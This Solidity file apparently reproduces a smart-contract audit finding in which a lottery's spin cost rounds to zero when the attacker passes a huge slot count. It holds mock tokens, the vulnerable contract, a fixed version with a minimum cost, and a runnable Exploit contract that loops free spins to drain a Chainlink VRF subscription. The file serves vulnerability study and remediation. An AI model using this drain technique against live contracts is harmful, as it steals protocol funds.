// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62538:
// "[H-01] Funds in subscription may be drained".
//
// In SpinLottery, each `spin` charges the player `calculateSpinCost` USDC and
// then fires a Chainlink VRF request, which bills the protocol's VRF
// subscription. The cost formula
//
//     (avgBasePrice * _prizeCount * 1000) / (_totalSlots * 1000)
//
// takes the ATTACKER-CONTROLLED `_totalSlots` in the denominator with NO minimum
// floor. By passing a huge `_totalSlots` (e.g. 1e12), the integer division rounds
// the spin cost down to 0. The attacker therefore spends 0 USDC per spin, yet
// each spin still triggers a VRF request that deducts a real per-request fee from
// the subscription. Looping `spin` drains the entire VRF subscription balance
// (a griefing / direct-drain attack): the protocol's Chainlink funds are consumed
// while the attacker pays nothing.
//
// Harm marker: the drained LINK fees accumulate at the SINK (0x…D00d), which
// represents the Chainlink VRF coordinator receiving the drained subscription.
// Attacker USDC spend stays exactly 0.
//
// Faithful doubles for the opaque external boundaries only:
//   * MiniUSDC  — the opaque ERC20 payment token (transferFrom returns bool)
//   * MiniLINK  — the opaque ERC20 the subscription is funded/billed in
//   * MockVRFCoordinator — a minimal, faithful model of Chainlink VRF's
//     per-request subscription billing (deducts a fixed fee per request to SINK).
// The vulnerable contract (SpinLottery::spin / ::calculateSpinCost) is inlined
// VERBATIM from the finding and is never mocked.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Minimal faithful double for the opaque USDC payment token (6 decimals).
contract MiniUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal faithful double for the opaque LINK token (18 decimals) that the
///      Chainlink VRF subscription is funded and billed in.
contract MiniLINK {
    string public name = "ChainLink Token";
    string public symbol = "LINK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful minimal model of the opaque Chainlink VRF coordinator's
///      SUBSCRIPTION per-request billing. Each randomness request deducts a fixed
///      fee from the subscription balance and pays it out to SINK (the coordinator
///      fee sink representing Chainlink). This is the well-defined billing model
///      described by the finding — the vulnerable contract is NOT this double.
contract MockVRFCoordinator {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    IERC20 public link;
    uint256 public immutable vrfFee;
    uint256 public subscriptionBalance;
    uint256 public requestCounter;

    constructor(address _link, uint256 _vrfFee) {
        link = IERC20(_link);
        vrfFee = _vrfFee;
    }

    /// @notice Record LINK already transferred into the coordinator as the
    ///         subscription's spendable balance.
    function fundSubscription(uint256 amount) external {
        subscriptionBalance += amount;
    }

    /// @notice Chainlink VRF-style request. Bills the subscription a fixed fee.
    function requestRandomWords(uint64, /*subId*/ uint32 /*callbackGasLimit*/ )
        external
        returns (uint256 requestId)
    {
        require(subscriptionBalance >= vrfFee, "VRF: subscription underfunded");
        subscriptionBalance -= vrfFee;
        link.transfer(SINK, vrfFee); // fee leaves the subscription for Chainlink (SINK)
        return ++requestCounter;
    }
}

/// @dev Minimal Pausable base to supply the verbatim `whenNotPaused` modifier.
abstract contract Pausable {
    bool public paused;

    modifier whenNotPaused() {
        require(!paused, "Pausable: paused");
        _;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. `spin` and `calculateSpinCost` are inlined VERBATIM from
// the finding; the surrounding state and `requestRandomness()` are the faithful
// minimal scaffolding needed to reach the verbatim path.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLottery is Pausable {
    error USDCTransferFailed();

    struct SpinRequest {
        address player;
        uint256 totalSlots;
        uint256 prizeCount;
    }

    IERC20 public usdcToken;
    MockVRFCoordinator public coordinator;
    uint256 public avgBasePrice;
    uint64 public subscriptionId;
    uint32 public callbackGasLimit;
    mapping(uint256 => SpinRequest) public spinRequests;

    constructor(address _usdc, address _coordinator, uint256 _avgBasePrice) {
        usdcToken = IERC20(_usdc);
        coordinator = MockVRFCoordinator(_coordinator);
        avgBasePrice = _avgBasePrice;
        subscriptionId = 1;
        callbackGasLimit = 200000;
    }

    /// @dev Faithful minimal VRF request helper — fires a subscription-billed
    ///      randomness request through the coordinator.
    function requestRandomness() internal returns (uint256 requestId) {
        requestId = coordinator.requestRandomWords(subscriptionId, callbackGasLimit);
    }

    // ── VERBATIM from the finding (do not paraphrase) ──────────────────────────
    function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
        uint256 spinCost = calculateSpinCost(_totalSlots, _prizeCount);

        // Process payment
        if (!usdcToken.transferFrom(msg.sender, address(this), spinCost)) {
            revert USDCTransferFailed();
        }
        uint256 requestId = requestRandomness();
        spinRequests[requestId] = SpinRequest({player: msg.sender, totalSlots: _totalSlots, prizeCount: _prizeCount});
    }

    function calculateSpinCost(uint256 _totalSlots, uint256 _prizeCount) public view returns (uint256) {
        return (avgBasePrice * _prizeCount * 1000) / (_totalSlots * 1000); // @> attacker-controlled _totalSlots rounds spinCost down to 0 (no minimum) → free VRF requests drain the subscription
    }
    // ───────────────────────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: enforces a minimum spin cost, per the finding's recommendation
// ("Add one minimum spin cost."). The huge-slots free spin now costs real USDC,
// so the free drain is blocked.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLotteryFixed is Pausable {
    error USDCTransferFailed();

    struct SpinRequest {
        address player;
        uint256 totalSlots;
        uint256 prizeCount;
    }

    uint256 public constant MIN_SPIN_COST = 1e5; // 0.1 USDC minimum per spin

    IERC20 public usdcToken;
    MockVRFCoordinator public coordinator;
    uint256 public avgBasePrice;
    uint64 public subscriptionId;
    uint32 public callbackGasLimit;
    mapping(uint256 => SpinRequest) public spinRequests;

    constructor(address _usdc, address _coordinator, uint256 _avgBasePrice) {
        usdcToken = IERC20(_usdc);
        coordinator = MockVRFCoordinator(_coordinator);
        avgBasePrice = _avgBasePrice;
        subscriptionId = 1;
        callbackGasLimit = 200000;
    }

    function requestRandomness() internal returns (uint256 requestId) {
        requestId = coordinator.requestRandomWords(subscriptionId, callbackGasLimit);
    }

    function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
        uint256 spinCost = calculateSpinCost(_totalSlots, _prizeCount);

        if (!usdcToken.transferFrom(msg.sender, address(this), spinCost)) {
            revert USDCTransferFailed();
        }
        uint256 requestId = requestRandomness();
        spinRequests[requestId] = SpinRequest({player: msg.sender, totalSlots: _totalSlots, prizeCount: _prizeCount});
    }

    function calculateSpinCost(uint256 _totalSlots, uint256 _prizeCount) public view returns (uint256) {
        uint256 cost = (avgBasePrice * _prizeCount * 1000) / (_totalSlots * 1000);
        return cost < MIN_SPIN_COST ? MIN_SPIN_COST : cost; // FIX: enforce a minimum spin cost
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the attacker loops `spin(1e12, 1)` — each spin costs 0 USDC but
// burns one VRF fee from the subscription. After 10 spins the 10-LINK subscription
// is fully drained to the SINK while the attacker's USDC spend stays exactly 0.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant AVG_BASE_PRICE = 10e6; // 10 USDC
    uint256 internal constant HUGE_SLOTS = 1e12; // denominator that rounds cost to 0
    uint256 internal constant SUBSCRIPTION = 10e18; // 10 LINK funded
    uint256 internal constant VRF_FEE = 1e18; // 1 LINK per VRF request
    uint256 internal constant SPINS = 10; // drains 10 LINK
    uint256 internal constant ATTACKER_USDC = 1000e6; // attacker holds 1000 USDC

    // Exposed results.
    uint256 public spinCostPerSpin;
    uint256 public subscriptionBefore;
    uint256 public subscriptionAfter;
    uint256 public attackerUsdcBefore;
    uint256 public attackerUsdcAfter;
    uint256 public attackerUsdcSpent;
    uint256 public sinkLinkDrained;
    address public lotteryAddr;
    address public linkAddr; // profit token measured at SINK
    address public usdcAddr;
    address public coordinatorAddr;

    function run() external payable {
        // --- deploy doubles + the real vulnerable contract, fixed order ---
        MiniUSDC usdc = new MiniUSDC(); // nonce 1
        MiniLINK link = new MiniLINK(); // nonce 2
        MockVRFCoordinator coord = new MockVRFCoordinator(address(link), VRF_FEE); // nonce 3
        SpinLottery lottery = new SpinLottery(address(usdc), address(coord), AVG_BASE_PRICE); // nonce 4

        lotteryAddr = address(lottery);
        linkAddr = address(link);
        usdcAddr = address(usdc);
        coordinatorAddr = address(coord);

        // --- fund the VRF subscription with 10 LINK held by the coordinator ---
        link.mint(address(coord), SUBSCRIPTION);
        coord.fundSubscription(SUBSCRIPTION);

        // --- attacker holds USDC and approves the lottery (spend should stay 0) ---
        usdc.mint(address(this), ATTACKER_USDC);
        usdc.approve(address(lottery), type(uint256).max);

        attackerUsdcBefore = usdc.balanceOf(address(this));
        subscriptionBefore = coord.subscriptionBalance();

        // --- the free-spin cost rounds to 0 for huge _totalSlots ---
        spinCostPerSpin = lottery.calculateSpinCost(HUGE_SLOTS, 1);

        // --- loop: each free spin burns one VRF fee from the subscription ---
        for (uint256 i = 0; i < SPINS; i++) {
            lottery.spin(HUGE_SLOTS, 1);
        }

        subscriptionAfter = coord.subscriptionBalance();
        attackerUsdcAfter = usdc.balanceOf(address(this));
        attackerUsdcSpent = attackerUsdcBefore - attackerUsdcAfter;
        sinkLinkDrained = link.balanceOf(SINK);

        // --- HARM: subscription fully drained, attacker paid nothing ---
        require(spinCostPerSpin == 0, "spin was not free");
        require(attackerUsdcSpent == 0, "attacker paid USDC");
        require(subscriptionAfter == 0, "subscription not drained");
        require(sinkLinkDrained == SUBSCRIPTION, "sink did not receive drained fees");
    }
}
